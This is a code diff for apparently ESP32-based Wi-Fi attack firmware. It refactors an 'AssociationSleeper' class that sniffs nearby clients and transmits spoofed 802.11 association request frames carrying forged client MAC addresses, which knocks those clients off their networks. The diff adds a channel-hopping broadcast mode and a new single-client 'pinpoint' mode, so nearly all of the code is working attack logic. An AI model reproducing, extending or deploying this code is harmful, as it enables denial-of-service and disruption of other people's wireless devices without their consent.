@@ -4,13 +4,7 @@
 #include <esp_wifi.h>
 #include "Config.h"
 
-// --- NEW: Add static instance for the callback ---
 AssociationSleeper* AssociationSleeper::instance_ = nullptr;
-
-static uint8_t association_packet[200] = {
-    0x00, 0x00, 0x3a, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x0a, 0x00, 0x00, 0x00      
-};
 
 AssociationSleeper::AssociationSleeper() : 
     app_(nullptr),
@@ -33,9 +27,10 @@ void AssociationSleeper::setup(App* app) {
 
 bool AssociationSleeper::start(const WifiNetworkInfo& ap) {
     if (isActive_) stop();
-    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting Targeted Association Sleep attack on %s", ap.ssid);
+    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting NORMAL Association Sleep attack on %s", ap.ssid);
 
-    attackMode_ = AttackMode::TARGETED;
+    // <-- FIX: Use new enum and member variable
+    attackType_ = AttackType::NORMAL;
     targetAp_ = ap;
     isActive_ = true;
     state_ = State::SNIFFING;
@@ -54,9 +49,10 @@ bool AssociationSleeper::start(const WifiNetworkInfo& ap) {
 
 bool AssociationSleeper::start() {
     if (isActive_) stop();
-    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting Broadcast Association Sleep attack.");
+    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting BROADCAST Association Sleep attack.");
 
-    attackMode_ = AttackMode::BROADCAST;
+    // <-- FIX: Use new enum and member variable
+    attackType_ = AttackType::BROADCAST;
     isActive_ = true;
     packetCounter_ = 0;
     
@@ -67,15 +63,37 @@ bool AssociationSleeper::start() {
         return false;
     }
 
-    // --- NEW: Setup broadcast sniffing ---
     newClientsFound_.clear();
     recentlyAttacked_.clear();
     channelHopIndex_ = 0;
     esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
-    // THE FIX: Use the central channel list
     esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
     lastChannelHopTime_ = millis();
 
+    app_->getHardwareManager().setPerformanceMode(true);
+    return true;
+}
+
+// <-- NEW: Implementation for Pinpoint Client attack ---
+bool AssociationSleeper::start(const StationInfo& client) {
+    if (isActive_) stop();
+    char macStr[18];
+    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
+    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting PINPOINT Association Sleep attack on %s", macStr);
+
+    attackType_ = AttackType::PINPOINT_CLIENT;
+    pinpointTarget_ = client;
+    targetAp_.channel = client.channel; // Store the channel for packet sending
+    memcpy(targetAp_.bssid, client.ap_bssid, 6);
+
+    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
+    if (!rfLock_ || !rfLock_->isValid()) {
+        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to acquire RF lock for pinpoint.");
+        return false;
+    }
+    
+    isActive_ = true;
+    packetCounter_ = 0;
     app_->getHardwareManager().setPerformanceMode(true);
     return true;
 }
@@ -84,7 +102,8 @@ void AssociationSleeper::stop() {
     if (!isActive_) return;
     LOG(LogLevel::INFO, "ASSOC_SLEEP", "Stopping Association Sleep attack.");
     isActive_ = false;
-    if (attackMode_ == AttackMode::TARGETED) {
+    // <-- FIX: Use new enum
+    if (attackType_ == AttackType::NORMAL) {
         stationSniffer_->stop();
     }
     rfLock_.reset();
@@ -94,50 +113,54 @@ void AssociationSleeper::stop() {
 void AssociationSleeper::loop() {
     if (!isActive_) return;
 
-    if (attackMode_ == AttackMode::TARGETED) {
-        if (state_ == State::SNIFFING) {
-            if (stationSniffer_->getFoundStations().size() > 0) {
+    // <-- FIX: Use new enum and add new case
+    switch(attackType_) {
+        case AttackType::NORMAL:
+            if (state_ == State::SNIFFING && stationSniffer_->getFoundStations().size() > 0) {
                 LOG(LogLevel::INFO, "ASSOC_SLEEP", "Clients found, starting targeted attack phase.");
                 state_ = State::ATTACKING;
             }
-        }
+            if (state_ == State::ATTACKING) {
+                const auto& clients = stationSniffer_->getFoundStations();
+                if (clients.empty()) return;
 
-        if (state_ == State::ATTACKING) {
-            const auto& clients = stationSniffer_->getFoundStations();
-            if (clients.empty()) return;
+                if (millis() - lastTargetedPacketTime_ > 200) { 
+                    lastTargetedPacketTime_ = millis();
+                    if (currentClientIndex_ >= (int)clients.size()) {
+                        currentClientIndex_ = 0;
+                    }
+                    sendSleepPacket(clients[currentClientIndex_]);
+                    currentClientIndex_++;
+                }
+            }
+            break;
 
-            if (millis() - lastTargetedPacketTime_ > 200) { 
+        case AttackType::BROADCAST:
+            if (millis() - lastChannelHopTime_ > app_->getConfigManager().getSettings().channelHopDelayMs) {
+                lastChannelHopTime_ = millis();
+                channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
+                esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
+            }
+            if (!newClientsFound_.empty()) {
+                for (const auto& client : newClientsFound_) {
+                    char macStr[18];
+                    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
+                    if (recentlyAttacked_.find(macStr) == recentlyAttacked_.end() || millis() - recentlyAttacked_[macStr] > app_->getConfigManager().getSettings().attackCooldownMs) {
+                        LOG(LogLevel::INFO, "ASSOC_SLEEP", "Broadcast: Attacking new client %s on channel %d", macStr, client.channel);
+                        sendSleepPacket(client);
+                        recentlyAttacked_[macStr] = millis();
+                    }
+                }
+                newClientsFound_.clear();
+            }
+            break;
+            
+        case AttackType::PINPOINT_CLIENT:
+            if (millis() - lastTargetedPacketTime_ > 200) {
                 lastTargetedPacketTime_ = millis();
-                if (currentClientIndex_ >= (int)clients.size()) {
-                    currentClientIndex_ = 0;
-                }
-                sendSleepPacket(clients[currentClientIndex_]);
-                currentClientIndex_++;
+                sendSleepPacket(pinpointTarget_);
             }
-        }
-    } else { // BROADCAST MODE LOGIC
-        // 1. Channel Hopping
-        if (millis() - lastChannelHopTime_ > app_->getConfigManager().getSettings().channelHopDelayMs) {
-            lastChannelHopTime_ = millis();
-            channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
-            esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
-        }
-
-        // 2. Process and attack newly found clients
-        if (!newClientsFound_.empty()) {
-            for (const auto& client : newClientsFound_) {
-                char macStr[18];
-                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
-                
-                // Use the setting from ConfigManager
-                if (recentlyAttacked_.find(macStr) == recentlyAttacked_.end() || millis() - recentlyAttacked_[macStr] > app_->getConfigManager().getSettings().attackCooldownMs) {
-                    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Broadcast: Attacking new client %s on channel %d", macStr, client.channel);
-                    sendSleepPacket(client);
-                    recentlyAttacked_[macStr] = millis();
-                }
-            }
-            newClientsFound_.clear();
-        }
+            break;
     }
 }
 
@@ -149,7 +172,7 @@ void AssociationSleeper::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_t
 
 void AssociationSleeper::handlePacket(wifi_promiscuous_pkt_t *packet) {
     // This packet handler is ONLY for BROADCAST mode.
-    if (attackMode_ != AttackMode::BROADCAST) return;
+    if (attackType_ != AttackType::BROADCAST) return;
 
     const uint8_t *payload = packet->payload;
     const uint16_t frame_control = payload[0] | (payload[1] << 8);
@@ -199,23 +222,42 @@ void AssociationSleeper::handlePacket(wifi_promiscuous_pkt_t *packet) {
 void AssociationSleeper::sendSleepPacket(const StationInfo& client) {
     esp_wifi_set_channel(client.channel, WIFI_SECOND_CHAN_NONE);
     
-    // --- THIS PART IS NOW GENERIC ---
-    association_packet[0] = 0x00; association_packet[1] = 0x01;
-    memcpy(&association_packet[4], client.ap_bssid, 6);
-    memcpy(&association_packet[10], client.mac, 6);
-    memcpy(&association_packet[16], client.ap_bssid, 6);
-    association_packet[24] = 0x31; association_packet[25] = 0x04;
+    // --- THIS IS THE CORRECT IMPLEMENTATION ---
+    // 1. Create a local, mutable copy from the centralized template.
+    //    We need a copy because we're going to modify it with the client/AP MAC addresses.
+    uint8_t association_packet[sizeof(RawFrames::Mgmt::AssociationRequest::TEMPLATE)];
+    memcpy(association_packet, RawFrames::Mgmt::AssociationRequest::TEMPLATE, sizeof(RawFrames::Mgmt::AssociationRequest::TEMPLATE));
 
-    // This packet is minimal and doesn't include SSID or RSN, which is often sufficient.
-    esp_wifi_80211_tx(WIFI_IF_STA, association_packet, 30, false);
+    // 2. Modify the local copy with dynamic data.
+    association_packet[0] = 0x00; association_packet[1] = 0x01; // Set frame type to Association Request
+    memcpy(&association_packet[4], client.ap_bssid, 6);   // Destination Address (AP)
+    memcpy(&association_packet[10], client.mac, 6);       // Source Address (Client)
+    memcpy(&association_packet[16], client.ap_bssid, 6);  // BSSID (AP)
+    association_packet[24] = 0x31; association_packet[25] = 0x04; // Capability Info
+
+    // 3. Send the modified local copy.
+    esp_wifi_80211_tx(WIFI_IF_STA, association_packet, sizeof(association_packet), false);
     packetCounter_++;
 }
 
 bool AssociationSleeper::isActive() const { return isActive_; }
 uint32_t AssociationSleeper::getPacketCount() const { return packetCounter_; }
 std::string AssociationSleeper::getTargetSsid() const { return std::string(targetAp_.ssid); }
+
 int AssociationSleeper::getClientCount() const { 
-    return (attackMode_ == AttackMode::TARGETED) ? stationSniffer_->getFoundStations().size() : recentlyAttacked_.size();
+    // <-- FIX: Handle all attack types
+    switch(attackType_) {
+        case AttackType::NORMAL:
+            return stationSniffer_->getFoundStations().size();
+        case AttackType::BROADCAST:
+            return recentlyAttacked_.size();
+        case AttackType::PINPOINT_CLIENT:
+            return isActive_ ? 1 : 0;
+        default:
+            return 0;
+    }
 }
 bool AssociationSleeper::isSniffing() const { return state_ == State::SNIFFING; }
-AssociationSleeper::AttackMode AssociationSleeper::getAttackMode() const { return attackMode_; }
+
+// <-- FIX: Correct the function signature and return value ---
+AssociationSleeper::AttackType AssociationSleeper::getAttackType() const { return attackType_; }
